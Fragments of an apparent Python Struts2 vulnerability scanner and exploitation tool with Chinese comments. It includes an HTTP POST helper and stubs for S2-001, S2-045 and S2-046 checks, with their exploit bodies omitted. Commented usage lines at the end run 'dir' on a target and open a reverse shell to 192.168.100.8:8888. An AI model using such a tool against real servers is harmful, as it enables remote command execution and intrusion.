...
def post(url, data=None, headers=None, encoding='UTF-8', files=None):
    """POST请求发送包装"""
    try:  # 报错处理
        html = requests.post(url, data=data, headers=headers, proxies=proxies, timeout=_tiemout,
                             files=files)  # post方法发送HTTP包
        html = html.content.decode(encoding)  # 以制定的encoding方式解码
        return html.replace('\x00', '').strip()  # 去除\x00，空格和换行符，并返回信息
    except ChunkedEncodingError as e:  # 协议报错
        html = post_stream(url, data, headers, encoding, files)  # HTTP报头报错时，调用post_stream方法
        return html  # 返回页面信息
    except ConnectionError as e:  # 连接报错
        return "ERROR:" + "HTTP连接错误"
    except ConnectTimeout as e:  # 连接超时
        return "ERROR:" + "HTTP连接超时错误"
    except Exception as e:  # 其他报错
        return 'ERROR:' + str(e)
...
class S2_001:
    """S2-001漏洞检测利用类"""
    info = "[+] S2-001:影响版本Struts 2.0.0-2.0.8; 获取web目录绝对路径; "
...
class S2_045:
    """S2-045漏洞检测利用类"""
    info = "[+] S2-045:影响版本Struts 2.3.5-2.3.31,2.5-2.5.10; POST请求发送数据,不需要参数; 支持获取WEB路径"
...
class S2_046:
    """S2-046漏洞检测利用类"""
    info = "[+] S2-046:影响版本Struts 2.3.5-2.3.31,2.5-2.5.10; POST请求发送数据,不需要参数; 支持获取WEB路径"
...
def struts2(info, url, file, name, header, encode, quiet, timeout,
         workers, webpath):
    """Struts2扫描工具"""
    print('-' * 15 + "struts2框架漏洞检测开始" + '-' * 15)
    data=None
...
#   s = S2_007("http://127.0.0.1:8080/S2_001/login.action", "name=admin&email=admin")
#   s.check()
#   print(s.exec_cmd('dir'))
# s.reverse_shell('192.168.100.8', '8888')
